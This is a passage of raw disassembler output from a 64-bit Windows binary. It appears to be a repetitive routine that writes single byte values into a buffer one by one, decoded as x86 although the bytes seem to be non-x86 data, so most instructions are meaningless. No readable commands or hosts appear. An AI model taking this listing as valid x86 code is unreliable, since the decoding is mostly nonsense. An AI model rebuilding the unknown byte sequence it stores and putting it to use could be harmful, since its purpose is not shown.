   1400039d2:	00 58 1f             	add    %bl,0x1f(%rax)
   1400039d5:	1b 52 12             	sbb    0x12(%rdx),%edx
   1400039d8:	04 20                	add    $0x20,%al
   1400039da:	ae                   	scas   (%rdi),%al
   1400039db:	01 00                	add    %eax,(%rax)
   1400039dd:	00 58 1f             	add    %bl,0x1f(%rax)
   1400039e0:	30 52 12             	xor    %dl,0x12(%rdx)
   1400039e3:	04 20                	add    $0x20,%al
   1400039e5:	af                   	scas   (%rdi),%eax
   1400039e6:	01 00                	add    %eax,(%rax)
   1400039e8:	00 58 1c             	add    %bl,0x1c(%rax)
   1400039eb:	52                   	push   %rdx
   1400039ec:	12 04 20             	adc    (%rax,%riz,1),%al
   1400039ef:	b0 01                	mov    $0x1,%al
   1400039f1:	00 00                	add    %al,(%rax)
   1400039f3:	58                   	pop    %rax
   1400039f4:	1f                   	(bad)
   1400039f5:	15 52 12 04 20       	adc    $0x20041252,%eax
   1400039fa:	b1 01                	mov    $0x1,%cl
   1400039fc:	00 00                	add    %al,(%rax)
   1400039fe:	58                   	pop    %rax
   1400039ff:	20 8a 00 00 00 52    	and    %cl,0x52000000(%rdx)
   140003a05:	12 04 20             	adc    (%rax,%riz,1),%al
   140003a08:	b2 01                	mov    $0x1,%dl
   140003a0a:	00 00                	add    %al,(%rax)
   140003a0c:	58                   	pop    %rax
   140003a0d:	20 d8                	and    %bl,%al
   140003a0f:	00 00                	add    %al,(%rax)
   140003a11:	00 52 12             	add    %dl,0x12(%rdx)
   140003a14:	04 20                	add    $0x20,%al
   140003a16:	b3 01                	mov    $0x1,%bl
   140003a18:	00 00                	add    %al,(%rax)
   140003a1a:	58                   	pop    %rax
   140003a1b:	20 c4                	and    %al,%ah
   140003a1d:	00 00                	add    %al,(%rax)
   140003a1f:	00 52 12             	add    %dl,0x12(%rdx)
   140003a22:	04 20                	add    $0x20,%al
   140003a24:	b4 01                	mov    $0x1,%ah
   140003a26:	00 00                	add    %al,(%rax)
   140003a28:	58                   	pop    %rax
   140003a29:	20 c3                	and    %al,%bl
   140003a2b:	00 00                	add    %al,(%rax)
   140003a2d:	00 52 12             	add    %dl,0x12(%rdx)
   140003a30:	04 20                	add    $0x20,%al
   140003a32:	b5 01                	mov    $0x1,%ch
   140003a34:	00 00                	add    %al,(%rax)
   140003a36:	58                   	pop    %rax
   140003a37:	1f                   	(bad)
   140003a38:	16                   	(bad)
   140003a39:	52                   	push   %rdx
   140003a3a:	12 04 20             	adc    (%rax,%riz,1),%al
   140003a3d:	b6 01                	mov    $0x1,%dh
   140003a3f:	00 00                	add    %al,(%rax)
   140003a41:	58                   	pop    %rax
   140003a42:	1f                   	(bad)
   140003a43:	48 52                	rex.W push %rdx
   140003a45:	12 04 20             	adc    (%rax,%riz,1),%al
   140003a48:	b7 01                	mov    $0x1,%bh
   140003a4a:	00 00                	add    %al,(%rax)
   140003a4c:	58                   	pop    %rax
   140003a4d:	20 be 00 00 00 52    	and    %bh,0x52000000(%rsi)
   140003a53:	12 04 20             	adc    (%rax,%riz,1),%al
   140003a56:	b8 01 00 00 58       	mov    $0x58000001,%eax
   140003a5b:	1f                   	(bad)
   140003a5c:	29 52 12             	sub    %edx,0x12(%rdx)
   140003a5f:	04 20                	add    $0x20,%al
   140003a61:	b9 01 00 00 58       	mov    $0x58000001,%ecx
   140003a66:	1f                   	(bad)
   140003a67:	5c                   	pop    %rsp
   140003a68:	52                   	push   %rdx
   140003a69:	12 04 20             	adc    (%rax,%riz,1),%al
   140003a6c:	ba 01 00 00 58       	mov    $0x58000001,%edx
   140003a71:	20 f7                	and    %dh,%bh
   140003a73:	00 00                	add    %al,(%rax)
   140003a75:	00 52 12             	add    %dl,0x12(%rdx)
   140003a78:	04 20                	add    $0x20,%al
   140003a7a:	bb 01 00 00 58       	mov    $0x58000001,%ebx
   140003a7f:	1f                   	(bad)
   140003a80:	7f 52                	jg     0x140003ad4
   140003a82:	12 04 20             	adc    (%rax,%riz,1),%al
   140003a85:	bc 01 00 00 58       	mov    $0x58000001,%esp
   140003a8a:	1f                   	(bad)
   140003a8b:	1e                   	(bad)
   140003a8c:	52                   	push   %rdx
   140003a8d:	12 04 20             	adc    (%rax,%riz,1),%al
   140003a90:	bd 01 00 00 58       	mov    $0x58000001,%ebp
   140003a95:	20 fd                	and    %bh,%ch
   140003a97:	00 00                	add    %al,(%rax)
   140003a99:	00 52 12             	add    %dl,0x12(%rdx)
   140003a9c:	04 20                	add    $0x20,%al
   140003a9e:	be 01 00 00 58       	mov    $0x58000001,%esi
   140003aa3:	20 ab 00 00 00 52    	and    %ch,0x52000000(%rbx)
   140003aa9:	12 04 20             	adc    (%rax,%riz,1),%al
   140003aac:	bf 01 00 00 58       	mov    $0x58000001,%edi
   140003ab1:	1f                   	(bad)
   140003ab2:	15 52 12 04 20       	adc    $0x20041252,%eax
   140003ab7:	c0 01 00             	rolb   $0x0,(%rcx)
   140003aba:	00 58 20             	add    %bl,0x20(%rax)
   140003abd:	da 00                	fiaddl (%rax)
   140003abf:	00 00                	add    %al,(%rax)
   140003ac1:	52                   	push   %rdx
   140003ac2:	12 04 20             	adc    (%rax,%riz,1),%al
   140003ac5:	c1 01 00             	roll   $0x0,(%rcx)
   140003ac8:	00 58 20             	add    %bl,0x20(%rax)
   140003acb:	90                   	nop
   140003acc:	00 00                	add    %al,(%rax)
   140003ace:	00 52 12             	add    %dl,0x12(%rdx)
   140003ad1:	04 20                	add    $0x20,%al
   140003ad3:	c2 01 00             	ret    $0x1
   140003ad6:	00 58 20             	add    %bl,0x20(%rax)
   140003ad9:	fa                   	cli
   140003ada:	00 00                	add    %al,(%rax)
   140003adc:	00 52 12             	add    %dl,0x12(%rdx)
   140003adf:	04 20                	add    $0x20,%al
   140003ae1:	c3                   	ret
   140003ae2:	01 00                	add    %eax,(%rax)
   140003ae4:	00 58 20             	add    %bl,0x20(%rax)
   140003ae7:	f1                   	int1
   140003ae8:	00 00                	add    %al,(%rax)
   140003aea:	00 52 12             	add    %dl,0x12(%rdx)
   140003aed:	04 20                	add    $0x20,%al
   140003aef:	c4 01 00 00          	(bad)
   140003af3:	58                   	pop    %rax
   140003af4:	1f                   	(bad)
   140003af5:	50                   	push   %rax
   140003af6:	52                   	push   %rdx
   140003af7:	12 04 20             	adc    (%rax,%riz,1),%al
   140003afa:	c5 01 00             	(bad)
   140003afd:	00 58 20             	add    %bl,0x20(%rax)
   140003b00:	e3 00                	jrcxz  0x140003b02
   140003b02:	00 00                	add    %al,(%rax)
   140003b04:	52                   	push   %rdx
   140003b05:	12 04 20             	adc    (%rax,%riz,1),%al
   140003b08:	c6 01 00             	movb   $0x0,(%rcx)
   140003b0b:	00 58 20             	add    %bl,0x20(%rax)
   140003b0e:	f9                   	stc
   140003b0f:	00 00                	add    %al,(%rax)
   140003b11:	00 52 12             	add    %dl,0x12(%rdx)
   140003b14:	04 20                	add    $0x20,%al
   140003b16:	c7 01 00 00 58 20    	movl   $0x20580000,(%rcx)
   140003b1c:	92                   	xchg   %eax,%edx
   140003b1d:	00 00                	add    %al,(%rax)
   140003b1f:	00 52 12             	add    %dl,0x12(%rdx)
   140003b22:	04 20                	add    $0x20,%al
   140003b24:	c8 01 00 00          	enter  $0x1,$0x0
   140003b28:	58                   	pop    %rax
   140003b29:	1f                   	(bad)
   140003b2a:	2a 52 12             	sub    0x12(%rdx),%dl
   140003b2d:	04 20                	add    $0x20,%al
   140003b2f:	c9                   	leave
   140003b30:	01 00                	add    %eax,(%rax)
   140003b32:	00 58 1f             	add    %bl,0x1f(%rax)
   140003b35:	4d 52                	rex.WRB push %r10
   140003b37:	12 04 20             	adc    (%rax,%riz,1),%al
   140003b3a:	ca 01 00             	lret   $0x1
   140003b3d:	00 58 20             	add    %bl,0x20(%rax)
   140003b40:	e3 00                	jrcxz  0x140003b42
   140003b42:	00 00                	add    %al,(%rax)
   140003b44:	52                   	push   %rdx
   140003b45:	12 04 20             	adc    (%rax,%riz,1),%al
   140003b48:	cb                   	lret
   140003b49:	01 00                	add    %eax,(%rax)
   140003b4b:	00 58 1f             	add    %bl,0x1f(%rax)
   140003b4e:	36 52                	ss push %rdx
   140003b50:	12 04 20             	adc    (%rax,%riz,1),%al
   140003b53:	cc                   	int3
   140003b54:	01 00                	add    %eax,(%rax)
   140003b56:	00 58 1f             	add    %bl,0x1f(%rax)
   140003b59:	47 52                	rex.RXB push %r10
   140003b5b:	12 04 20             	adc    (%rax,%riz,1),%al
   140003b5e:	cd 01                	int    $0x1
   140003b60:	00 00                	add    %al,(%rax)
   140003b62:	58                   	pop    %rax
   140003b63:	20 9d 00 00 00 52    	and    %bl,0x52000000(%rbp)
   140003b69:	12 04 20             	adc    (%rax,%riz,1),%al
   140003b6c:	ce                   	(bad)
   140003b6d:	01 00                	add    %eax,(%rax)
   140003b6f:	00 58 20             	add    %bl,0x20(%rax)
   140003b72:	d4                   	(bad)
   140003b73:	00 00                	add    %al,(%rax)
   140003b75:	00 52 12             	add    %dl,0x12(%rdx)
   140003b78:	04 20                	add    $0x20,%al
   140003b7a:	cf                   	iret
   140003b7b:	01 00                	add    %eax,(%rax)
   140003b7d:	00 58 1e             	add    %bl,0x1e(%rax)
   140003b80:	52                   	push   %rdx
   140003b81:	12 04 20             	adc    (%rax,%riz,1),%al
   140003b84:	d0 01                	rolb   $1,(%rcx)
   140003b86:	00 00                	add    %al,(%rax)
   140003b88:	58                   	pop    %rax
   140003b89:	1f                   	(bad)
   140003b8a:	4f 52                	rex.WRXB push %r10
   140003b8c:	12 04 20             	adc    (%rax,%riz,1),%al
   140003b8f:	d1 01                	roll   $1,(%rcx)
   140003b91:	00 00                	add    %al,(%rax)
   140003b93:	58                   	pop    %rax
   140003b94:	20 81 00 00 00 52    	and    %al,0x52000000(%rcx)
   140003b9a:	12 04 20             	adc    (%rax,%riz,1),%al
   140003b9d:	d2 01                	rolb   %cl,(%rcx)
   140003b9f:	00 00                	add    %al,(%rax)
   140003ba1:	58                   	pop    %rax
   140003ba2:	20 c7                	and    %al,%bh
   140003ba4:	00 00                	add    %al,(%rax)
   140003ba6:	00 52 12             	add    %dl,0x12(%rdx)
   140003ba9:	04 20                	add    $0x20,%al
   140003bab:	d3 01                	roll   %cl,(%rcx)
   140003bad:	00 00                	add    %al,(%rax)
   140003baf:	58                   	pop    %rax
   140003bb0:	1b 52 12             	sbb    0x12(%rdx),%edx
   140003bb3:	04 20                	add    $0x20,%al
   140003bb5:	d4                   	(bad)
   140003bb6:	01 00                	add    %eax,(%rax)
   140003bb8:	00 58 20             	add    %bl,0x20(%rax)
   140003bbb:	be 00 00 00 52       	mov    $0x52000000,%esi
   140003bc0:	12 04 20             	adc    (%rax,%riz,1),%al
   140003bc3:	d5 01 00 00          	{rex2 0x1} add %al,(%r8)
   140003bc7:	58                   	pop    %rax
   140003bc8:	20 c5                	and    %al,%ch
   140003bca:	00 00                	add    %al,(%rax)
   140003bcc:	00 52 12             	add    %dl,0x12(%rdx)
   140003bcf:	04 20                	add    $0x20,%al
   140003bd1:	d6                   	udb
   140003bd2:	01 00                	add    %eax,(%rax)
   140003bd4:	00 58 20             	add    %bl,0x20(%rax)
   140003bd7:	85 00                	test   %eax,(%rax)
   140003bd9:	00 00                	add    %al,(%rax)
   140003bdb:	52                   	push   %rdx
   140003bdc:	12 04 20             	adc    (%rax,%riz,1),%al
   140003bdf:	d7                   	xlat   (%rbx)
   140003be0:	01 00                	add    %eax,(%rax)
   140003be2:	00 58 1f             	add    %bl,0x1f(%rax)
   140003be5:	14 52                	adc    $0x52,%al
   140003be7:	12 04 20             	adc    (%rax,%riz,1),%al
   140003bea:	d8 01                	fadds  (%rcx)
   140003bec:	00 00                	add    %al,(%rax)
   140003bee:	58                   	pop    %rax
   140003bef:	20 ab 00 00 00 52    	and    %ch,0x52000000(%rbx)
   140003bf5:	12 04 20             	adc    (%rax,%riz,1),%al
   140003bf8:	d9 01                	flds   (%rcx)
   140003bfa:	00 00                	add    %al,(%rax)
   140003bfc:	58                   	pop    %rax
   140003bfd:	20 d1                	and    %dl,%cl
   140003bff:	00 00                	add    %al,(%rax)
   140003c01:	00 52 12             	add    %dl,0x12(%rdx)
   140003c04:	04 20                	add    $0x20,%al
   140003c06:	da 01                	fiaddl (%rcx)
   140003c08:	00 00                	add    %al,(%rax)
   140003c0a:	58                   	pop    %rax
   140003c0b:	1f                   	(bad)
   140003c0c:	5c                   	pop    %rsp
   140003c0d:	52                   	push   %rdx
   140003c0e:	12 04 20             	adc    (%rax,%riz,1),%al
   140003c11:	db 01                	fildl  (%rcx)
   140003c13:	00 00                	add    %al,(%rax)
   140003c15:	58                   	pop    %rax
   140003c16:	1f                   	(bad)
   140003c17:	5e                   	pop    %rsi
   140003c18:	52                   	push   %rdx
   140003c19:	12 04 20             	adc    (%rax,%riz,1),%al
   140003c1c:	dc 01                	faddl  (%rcx)
   140003c1e:	00 00                	add    %al,(%rax)
   140003c20:	58                   	pop    %rax
   140003c21:	1f                   	(bad)
   140003c22:	1d 52 12 04 20       	sbb    $0x20041252,%eax
   140003c27:	dd 01                	fldl   (%rcx)
   140003c29:	00 00                	add    %al,(%rax)
   140003c2b:	58                   	pop    %rax
   140003c2c:	20 b6 00 00 00 52    	and    %dh,0x52000000(%rsi)
   140003c32:	12 04 20             	adc    (%rax,%riz,1),%al
   140003c35:	de 01                	fiadds (%rcx)
   140003c37:	00 00                	add    %al,(%rax)
   140003c39:	58                   	pop    %rax
   140003c3a:	20 d4                	and    %dl,%ah
   140003c3c:	00 00                	add    %al,(%rax)
   140003c3e:	00 52 12             	add    %dl,0x12(%rdx)
   140003c41:	04 20                	add    $0x20,%al
   140003c43:	df 01                	filds  (%rcx)
   140003c45:	00 00                	add    %al,(%rax)
   140003c47:	58                   	pop    %rax
   140003c48:	1f                   	(bad)
   140003c49:	0c 52                	or     $0x52,%al
   140003c4b:	12 04 20             	adc    (%rax,%riz,1),%al
   140003c4e:	e0 01                	loopne 0x140003c51
   140003c50:	00 00                	add    %al,(%rax)
   140003c52:	58                   	pop    %rax
   140003c53:	20 b5 00 00 00 52    	and    %dh,0x52000000(%rbp)
   140003c59:	12 04 20             	adc    (%rax,%riz,1),%al
   140003c5c:	e1 01                	loope  0x140003c5f
   140003c5e:	00 00                	add    %al,(%rax)
   140003c60:	58                   	pop    %rax
   140003c61:	20 fe                	and    %bh,%dh
   140003c63:	00 00                	add    %al,(%rax)
   140003c65:	00 52 12             	add    %dl,0x12(%rdx)
   140003c68:	04 20                	add    $0x20,%al
   140003c6a:	e2 01                	loop   0x140003c6d
   140003c6c:	00 00                	add    %al,(%rax)
   140003c6e:	58                   	pop    %rax
   140003c6f:	1f                   	(bad)
   140003c70:	48 52                	rex.W push %rdx
   140003c72:	12 04 20             	adc    (%rax,%riz,1),%al
   140003c75:	e3 01                	jrcxz  0x140003c78
   140003c77:	00 00                	add    %al,(%rax)
   140003c79:	58                   	pop    %rax
   140003c7a:	20 95 00 00 00 52    	and    %dl,0x52000000(%rbp)
   140003c80:	12 04 20             	adc    (%rax,%riz,1),%al
   140003c83:	e4 01                	in     $0x1,%al
   140003c85:	00 00                	add    %al,(%rax)
   140003c87:	58                   	pop    %rax
   140003c88:	1f                   	(bad)
   140003c89:	5b                   	pop    %rbx
   140003c8a:	52                   	push   %rdx
   140003c8b:	12 04 20             	adc    (%rax,%riz,1),%al
   140003c8e:	e5 01                	in     $0x1,%eax
   140003c90:	00 00                	add    %al,(%rax)
   140003c92:	58                   	pop    %rax
   140003c93:	20 cf                	and    %cl,%bh
   140003c95:	00 00                	add    %al,(%rax)
   140003c97:	00 52 12             	add    %dl,0x12(%rdx)
   140003c9a:	04 20                	add    $0x20,%al
   140003c9c:	e6 01                	out    %al,$0x1
   140003c9e:	00 00                	add    %al,(%rax)
   140003ca0:	58                   	pop    %rax
   140003ca1:	20 cf                	and    %cl,%bh
   140003ca3:	00 00                	add    %al,(%rax)
   140003ca5:	00 52 12             	add    %dl,0x12(%rdx)
   140003ca8:	04 20                	add    $0x20,%al
   140003caa:	e7 01                	out    %eax,$0x1
   140003cac:	00 00                	add    %al,(%rax)
   140003cae:	58                   	pop    %rax
   140003caf:	20 b3 00 00 00 52    	and    %dh,0x52000000(%rbx)
   140003cb5:	12 04 20             	adc    (%rax,%riz,1),%al
   140003cb8:	e8 01 00 00 58       	call   0x198003cbe
   140003cbd:	20 ab 00 00 00 52    	and    %ch,0x52000000(%rbx)
   140003cc3:	12 04 20             	adc    (%rax,%riz,1),%al
   140003cc6:	e9 01 00 00 58       	jmp    0x198003ccc
   140003ccb:	20 c9                	and    %cl,%cl
   140003ccd:	00 00                	add    %al,(%rax)
   140003ccf:	00 52 12             	add    %dl,0x12(%rdx)
   140003cd2:	04 20                	add    $0x20,%al
   140003cd4:	ea                   	(bad)
   140003cd5:	01 00                	add    %eax,(%rax)
   140003cd7:	00 58 1f             	add    %bl,0x1f(%rax)
   140003cda:	5f                   	pop    %rdi
   140003cdb:	52                   	push   %rdx
   140003cdc:	12 04 20             	adc    (%rax,%riz,1),%al
   140003cdf:	eb 01                	jmp    0x140003ce2
   140003ce1:	00 00                	add    %al,(%rax)
   140003ce3:	58                   	pop    %rax
   140003ce4:	1f                   	(bad)
   140003ce5:	12 52 12             	adc    0x12(%rdx),%dl
   140003ce8:	04 20                	add    $0x20,%al
   140003cea:	ec                   	in     (%dx),%al
   140003ceb:	01 00                	add    %eax,(%rax)
   140003ced:	00 58 1f             	add    %bl,0x1f(%rax)
   140003cf0:	7a 52                	jp     0x140003d44
   140003cf2:	12 04 20             	adc    (%rax,%riz,1),%al
   140003cf5:	ed                   	in     (%dx),%eax
   140003cf6:	01 00                	add    %eax,(%rax)
   140003cf8:	00 58 20             	add    %bl,0x20(%rax)
   140003cfb:	f0 00 00             	lock add %al,(%rax)
   140003cfe:	00 52 12             	add    %dl,0x12(%rdx)
   140003d01:	04 20                	add    $0x20,%al
   140003d03:	ee                   	out    %al,(%dx)
   140003d04:	01 00                	add    %eax,(%rax)
   140003d06:	00 58 20             	add    %bl,0x20(%rax)
   140003d09:	dd 00                	fldl   (%rax)
   140003d0b:	00 00                	add    %al,(%rax)
   140003d0d:	52                   	push   %rdx
   140003d0e:	12 04 20             	adc    (%rax,%riz,1),%al
   140003d11:	ef                   	out    %eax,(%dx)
   140003d12:	01 00                	add    %eax,(%rax)
   140003d14:	00 58 1f             	add    %bl,0x1f(%rax)
   140003d17:	79 52                	jns    0x140003d6b
   140003d19:	12 04 20             	adc    (%rax,%riz,1),%al
   140003d1c:	f0 01 00             	lock add %eax,(%rax)
   140003d1f:	00 58 1f             	add    %bl,0x1f(%rax)
   140003d22:	15 52 12 04 20       	adc    $0x20041252,%eax
   140003d27:	f1                   	int1
   140003d28:	01 00                	add    %eax,(%rax)
   140003d2a:	00 58 1f             	add    %bl,0x1f(%rax)
   140003d2d:	1a 52 12             	sbb    0x12(%rdx),%dl
   140003d30:	04 20                	add    $0x20,%al
   140003d32:	f2 01 00             	repnz add %eax,(%rax)
   140003d35:	00 58 17             	add    %bl,0x17(%rax)
   140003d38:	52                   	push   %rdx
   140003d39:	12 04 20             	adc    (%rax,%riz,1),%al
   140003d3c:	f3 01 00             	repz add %eax,(%rax)
   140003d3f:	00 58 20             	add    %bl,0x20(%rax)
   140003d42:	fa                   	cli
   140003d43:	00 00                	add    %al,(%rax)
   140003d45:	00 52 12             	add    %dl,0x12(%rdx)
   140003d48:	04 20                	add    $0x20,%al
   140003d4a:	f4                   	hlt
   140003d4b:	01 00                	add    %eax,(%rax)
   140003d4d:	00 58 1f             	add    %bl,0x1f(%rax)
   140003d50:	1a 52 12             	sbb    0x12(%rdx),%dl
   140003d53:	04 20                	add    $0x20,%al
   140003d55:	f5                   	cmc
   140003d56:	01 00                	add    %eax,(%rax)
   140003d58:	00 58 20             	add    %bl,0x20(%rax)
   140003d5b:	af                   	scas   (%rdi),%eax
   140003d5c:	00 00                	add    %al,(%rax)
   140003d5e:	00 52 12             	add    %dl,0x12(%rdx)
   140003d61:	04 20                	add    $0x20,%al
   140003d63:	f6 01 00             	testb  $0x0,(%rcx)
   140003d66:	00 58 20             	add    %bl,0x20(%rax)
   140003d69:	e5 00                	in     $0x0,%eax
   140003d6b:	00 00                	add    %al,(%rax)
   140003d6d:	52                   	push   %rdx
   140003d6e:	12 04 20             	adc    (%rax,%riz,1),%al
   140003d71:	f7 01 00 00 58 20    	testl  $0x20580000,(%rcx)
   140003d77:	8f 00                	pop    (%rax)
   140003d79:	00 00                	add    %al,(%rax)
   140003d7b:	52                   	push   %rdx
   140003d7c:	12 04 20             	adc    (%rax,%riz,1),%al
   140003d7f:	f8                   	clc
   140003d80:	01 00                	add    %eax,(%rax)
   140003d82:	00 58 1f             	add    %bl,0x1f(%rax)
   140003d85:	60                   	(bad)
   140003d86:	52                   	push   %rdx
   140003d87:	12 04 20             	adc    (%rax,%riz,1),%al
   140003d8a:	f9                   	stc
   140003d8b:	01 00                	add    %eax,(%rax)
   140003d8d:	00 58 1f             	add    %bl,0x1f(%rax)
   140003d90:	13 52 12             	adc    0x12(%rdx),%edx
   140003d93:	04 20                	add    $0x20,%al
   140003d95:	fa                   	cli
   140003d96:	01 00                	add    %eax,(%rax)
   140003d98:	00 58 1f             	add    %bl,0x1f(%rax)
   140003d9b:	71 52                	jno    0x140003def
   140003d9d:	12 04 20             	adc    (%rax,%riz,1),%al
   140003da0:	fb                   	sti
   140003da1:	01 00                	add    %eax,(%rax)
   140003da3:	00 58 1f             	add    %bl,0x1f(%rax)
   140003da6:	60                   	(bad)
   140003da7:	52                   	push   %rdx
   140003da8:	12 04 20             	adc    (%rax,%riz,1),%al
   140003dab:	fc                   	cld
   140003dac:	01 00                	add    %eax,(%rax)
   140003dae:	00 58 20             	add    %bl,0x20(%rax)
   140003db1:	df 00                	filds  (%rax)
   140003db3:	00 00                	add    %al,(%rax)
   140003db5:	52                   	push   %rdx
   140003db6:	12 04 20             	adc    (%rax,%riz,1),%al
   140003db9:	fd                   	std
   140003dba:	01 00                	add    %eax,(%rax)
   140003dbc:	00 58 20             	add    %bl,0x20(%rax)
   140003dbf:	a1 00 00 00 52 12 04 	movabs 0xfe20041252000000,%eax
   140003dc6:	20 fe 
   140003dc8:	01 00                	add    %eax,(%rax)
   140003dca:	00 58 20             	add    %bl,0x20(%rax)
   140003dcd:	b8 00 00 00 52       	mov    $0x52000000,%eax
   140003dd2:	12 04 20             	adc    (%rax,%riz,1),%al
   140003dd5:	ff 01                	incl   (%rcx)
   140003dd7:	00 00                	add    %al,(%rax)
   140003dd9:	58                   	pop    %rax
   140003dda:	1f                   	(bad)
   140003ddb:	33 52 12             	xor    0x12(%rdx),%edx
   140003dde:	04 20                	add    $0x20,%al
   140003de0:	00 02                	add    %al,(%rdx)
   140003de2:	00 00                	add    %al,(%rax)
   140003de4:	58                   	pop    %rax
   140003de5:	1f                   	(bad)
   140003de6:	51                   	push   %rcx
   140003de7:	52                   	push   %rdx
   140003de8:	12 04 20             	adc    (%rax,%riz,1),%al
   140003deb:	01 02                	add    %eax,(%rdx)
   140003ded:	00 00                	add    %al,(%rax)
   140003def:	58                   	pop    %rax
   140003df0:	1f                   	(bad)
   140003df1:	1b 52 12             	sbb    0x12(%rdx),%edx
   140003df4:	04 20                	add    $0x20,%al
   140003df6:	02 02                	add    (%rdx),%al
   140003df8:	00 00                	add    %al,(%rax)
   140003dfa:	58                   	pop    %rax
   140003dfb:	20 dd                	and    %bl,%ch
   140003dfd:	00 00                	add    %al,(%rax)
   140003dff:	00 52 12             	add    %dl,0x12(%rdx)
   140003e02:	04 20                	add    $0x20,%al
   140003e04:	03 02                	add    (%rdx),%eax
   140003e06:	00 00                	add    %al,(%rax)
   140003e08:	58                   	pop    %rax
   140003e09:	1f                   	(bad)
   140003e0a:	57                   	push   %rdi
   140003e0b:	52                   	push   %rdx
   140003e0c:	12 04 20             	adc    (%rax,%riz,1),%al
   140003e0f:	04 02                	add    $0x2,%al
   140003e11:	00 00                	add    %al,(%rax)
   140003e13:	58                   	pop    %rax
   140003e14:	20 f2                	and    %dh,%dl
   140003e16:	00 00                	add    %al,(%rax)
   140003e18:	00 52 12             	add    %dl,0x12(%rdx)
   140003e1b:	04 20                	add    $0x20,%al
   140003e1d:	05 02 00 00 58       	add    $0x58000002,%eax
   140003e22:	20 cb                	and    %cl,%bl
   140003e24:	00 00                	add    %al,(%rax)
   140003e26:	00 52 12             	add    %dl,0x12(%rdx)
   140003e29:	04 20                	add    $0x20,%al
   140003e2b:	06                   	(bad)
   140003e2c:	02 00                	add    (%rax),%al
   140003e2e:	00 58 20             	add    %bl,0x20(%rax)
   140003e31:	a2 00 00 00 52 12 04 	movabs %al,0x720041252000000
   140003e38:	20 07 
   140003e3a:	02 00                	add    (%rax),%al
   140003e3c:	00 58 1f             	add    %bl,0x1f(%rax)
   140003e3f:	3b 52 12             	cmp    0x12(%rdx),%edx
   140003e42:	04 20                	add    $0x20,%al
   140003e44:	08 02                	or     %al,(%rdx)
   140003e46:	00 00                	add    %al,(%rax)
   140003e48:	58                   	pop    %rax
   140003e49:	1f                   	(bad)
   140003e4a:	4b 52                	rex.WXB push %r10
   140003e4c:	12 04 20             	adc    (%rax,%riz,1),%al
   140003e4f:	09 02                	or     %eax,(%rdx)
   140003e51:	00 00                	add    %al,(%rax)
   140003e53:	58                   	pop    %rax
   140003e54:	1f                   	(bad)
   140003e55:	36 52                	ss push %rdx
   140003e57:	12 04 20             	adc    (%rax,%riz,1),%al
   140003e5a:	0a 02                	or     (%rdx),%al
   140003e5c:	00 00                	add    %al,(%rax)
   140003e5e:	58                   	pop    %rax
   140003e5f:	1f                   	(bad)
   140003e60:	25 52 12 04 20       	and    $0x20041252,%eax
   140003e65:	0b 02                	or     (%rdx),%eax
   140003e67:	00 00                	add    %al,(%rax)
   140003e69:	58                   	pop    %rax
   140003e6a:	1f                   	(bad)
   140003e6b:	18 52 12             	sbb    %dl,0x12(%rdx)
   140003e6e:	04 20                	add    $0x20,%al
   140003e70:	0c 02                	or     $0x2,%al
   140003e72:	00 00                	add    %al,(%rax)
   140003e74:	58                   	pop    %rax
   140003e75:	20 87 00 00 00 52    	and    %al,0x52000000(%rdi)
   140003e7b:	12 04 20             	adc    (%rax,%riz,1),%al
   140003e7e:	0d 02 00 00 58       	or     $0x58000002,%eax
   140003e83:	1f                   	(bad)
   140003e84:	31 52 12             	xor    %edx,0x12(%rdx)
   140003e87:	04 20                	add    $0x20,%al
   140003e89:	0e                   	(bad)
   140003e8a:	02 00                	add    (%rax),%al
   140003e8c:	00 58 1f             	add    %bl,0x1f(%rax)
   140003e8f:	7a 52                	jp     0x140003ee3
   140003e91:	12 04 20             	adc    (%rax,%riz,1),%al
   140003e94:	0f 02 00             	lar    (%rax),%eax
   140003e97:	00 58 1f             	add    %bl,0x1f(%rax)
   140003e9a:	0c 52                	or     $0x52,%al
   140003e9c:	12 04 20             	adc    (%rax,%riz,1),%al
   140003e9f:	10 02                	adc    %al,(%rdx)
   140003ea1:	00 00                	add    %al,(%rax)
   140003ea3:	58                   	pop    %rax
   140003ea4:	1f                   	(bad)
   140003ea5:	54                   	push   %rsp
   140003ea6:	52                   	push   %rdx
   140003ea7:	12 04 20             	adc    (%rax,%riz,1),%al
   140003eaa:	11 02                	adc    %eax,(%rdx)
   140003eac:	00 00                	add    %al,(%rax)
   140003eae:	58                   	pop    %rax
   140003eaf:	1f                   	(bad)
   140003eb0:	33 52 12             	xor    0x12(%rdx),%edx
   140003eb3:	04 20                	add    $0x20,%al
   140003eb5:	12 02                	adc    (%rdx),%al
   140003eb7:	00 00                	add    %al,(%rax)
   140003eb9:	58                   	pop    %rax
   140003eba:	1f                   	(bad)
   140003ebb:	5c                   	pop    %rsp
   140003ebc:	52                   	push   %rdx
   140003ebd:	12 04 20             	adc    (%rax,%riz,1),%al
   140003ec0:	13 02                	adc    (%rdx),%eax
   140003ec2:	00 00                	add    %al,(%rax)
   140003ec4:	58                   	pop    %rax
   140003ec5:	1c 52                	sbb    $0x52,%al
   140003ec7:	12 04 20             	adc    (%rax,%riz,1),%al
   140003eca:	14 02                	adc    $0x2,%al
   140003ecc:	00 00                	add    %al,(%rax)
   140003ece:	58                   	pop    %rax
   140003ecf:	20 e4                	and    %ah,%ah
   140003ed1:	00 00                	add    %al,(%rax)
   140003ed3:	00 52 12             	add    %dl,0x12(%rdx)
   140003ed6:	04 20                	add    $0x20,%al
   140003ed8:	15 02 00 00 58       	adc    $0x58000002,%eax
   140003edd:	20 a4 00 00 00 52 12 	and    %ah,0x12520000(%rax,%rax,1)
   140003ee4:	04 20                	add    $0x20,%al
   140003ee6:	16                   	(bad)
   140003ee7:	02 00                	add    (%rax),%al
   140003ee9:	00 58 20             	add    %bl,0x20(%rax)
   140003eec:	fd                   	std
   140003eed:	00 00                	add    %al,(%rax)
   140003eef:	00 52 12             	add    %dl,0x12(%rdx)
   140003ef2:	04 20                	add    $0x20,%al
   140003ef4:	17                   	(bad)
   140003ef5:	02 00                	add    (%rax),%al
   140003ef7:	00 58 1f             	add    %bl,0x1f(%rax)
   140003efa:	22 52 12             	and    0x12(%rdx),%dl
   140003efd:	04 20                	add    $0x20,%al
   140003eff:	18 02                	sbb    %al,(%rdx)
   140003f01:	00 00                	add    %al,(%rax)
   140003f03:	58                   	pop    %rax
   140003f04:	16                   	(bad)
   140003f05:	52                   	push   %rdx
   140003f06:	12 04 20             	adc    (%rax,%riz,1),%al
   140003f09:	19 02                	sbb    %eax,(%rdx)
   140003f0b:	00 00                	add    %al,(%rax)
   140003f0d:	58                   	pop    %rax
   140003f0e:	1f                   	(bad)
   140003f0f:	15 52 12 04 20       	adc    $0x20041252,%eax
